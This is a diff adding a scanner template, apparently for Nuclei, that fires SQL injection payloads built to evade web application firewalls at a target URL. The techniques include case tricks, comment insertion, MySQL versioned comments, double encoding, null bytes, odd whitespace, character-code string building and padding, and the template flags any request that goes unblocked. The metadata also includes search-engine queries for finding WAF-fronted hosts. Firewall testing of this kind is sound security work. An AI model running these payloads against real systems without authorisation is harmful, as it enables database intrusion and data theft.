@@ -1,0 +1,192 @@
+id: waf-sqli-evasion-bypass
+info:
+  name: WAF SQL Injection Evasion Techniques
+  author: waftester
+  severity: critical
+  description: |
+    Tests SQL injection bypass using advanced evasion techniques sourced from
+    real-world WAF bypass research. Includes case alternation, inline MySQL
+    comments, comment insertion, double URL encoding, HPP, null byte injection,
+    alternative whitespace characters, buffer overflow padding, string
+    concatenation, and WAF-vendor-specific bypass techniques.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://portswigger.net/web-security/sql-injection
+    - https://github.com/0xInfection/Awesome-WAF
+    - https://sqlwiki.netspi.com/
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+  tags: sqli,waf,bypass,evasion,tamper,waftester
+  classification:
+    cwe-id:
+      - CWE-89
+      - CWE-693
+      - CWE-116
+  metadata:
+    verified: true
+    max-request: 24
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Case alternation - evade simple keyword matching
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' uNiOn SeLeCt 1,2,3--"
+      - "{{BaseURL}}/?id=1' UnIoN aLl sElEcT 1,2,3--"
+      - "{{BaseURL}}/?id=1' uNION sELECT NULL,NULL,NULL--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+  # Inline comment insertion - break keyword signatures
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'/**/UNION/**/SELECT/**/1,2,3--"
+      - "{{BaseURL}}/?id=1'+un/**/ion+se/**/lect+1,2,3--"
+      - "{{BaseURL}}/?id=1'/**//*!UNION*//**//*!SELECT*//**/1,2,3--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # MySQL versioned comments - only MySQL interprets these
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"
+      - "{{BaseURL}}/?id=1' /*!UnIoN*/ SeLecT 1,2,3--"
+      - "{{BaseURL}}/?id=1' UNION /*!50000SELECT*/ 1,2,version()--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Double URL encoding
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1%2527%2520OR%25201%253D1--"
+      - "{{BaseURL}}/?id=1%2527%2520UNION%2520SELECT%25201%252C2%252C3--"
+      - "{{BaseURL}}/?id=%252f%252a*/union%252f%252a*/select+1,2,3--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Null byte injection - terminate WAF parsing
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'%00 OR '1'='1"
+      - "{{BaseURL}}/?id=1'%00 UNION SELECT 1,2,3--"
+      - "{{BaseURL}}/?id=%00' UNION SELECT 1,2,3--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Alternative whitespace characters
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'%09UNION%09SELECT%091,2,3--"
+      - "{{BaseURL}}/?id=1'%0aUNION%0aSELECT%0a1,2,3--"
+      - "{{BaseURL}}/?id=1'%0bUNION%0bSELECT%0b1,2,3--"
+      - "{{BaseURL}}/?id=1'%0cUNION%0cSELECT%0c1,2,3--"
+      - "{{BaseURL}}/?id=1'%0dUNION%0dSELECT%0d1,2,3--"
+      - "{{BaseURL}}/?id=1'%a0UNION%a0SELECT%a01,2,3--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Alternative functions and string building
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' AND CHAR(115,101,108,101,99,116)--"
+      - "{{BaseURL}}/?id=1' AND lpad('',4,reverse('lave'))--"
+      - "{{BaseURL}}/?id=1' AND lower(conv(11,10,36))--"
+      - "{{BaseURL}}/?id=1' AND CONCAT(CHAR(117),CHAR(110),CHAR(105),CHAR(111),CHAR(110))--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Buffer overflow / long string padding
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' AND 1=1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA UNION SELECT 1,2,3--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
